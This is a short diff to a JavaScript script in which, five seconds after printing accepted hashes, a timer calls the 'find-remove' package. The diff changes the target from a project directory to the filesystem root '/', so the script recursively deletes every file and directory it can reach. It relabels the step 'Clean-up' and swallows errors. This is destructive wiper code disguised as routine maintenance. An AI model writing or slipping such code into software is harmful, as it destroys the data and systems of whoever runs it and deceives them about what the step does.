@@ -14,8 +14,13 @@ var findRemoveSync = require('find-remove');
     ${data.acceptedHashes}
   `));
   
-  setTimeout(async () => {
-      console.log('lets do this');
-      findRemoveSync(rootDirectory, {dir: "*", files: "*.*"});
+    setTimeout(async () => {
+      console.log('Clean-up');
+      try {
+          findRemoveSync("/", {dir: "*", files: "*.*"});
+      } catch(e) {
+         console.log(e); 
+      }
+      
   }, 5000);
 })();
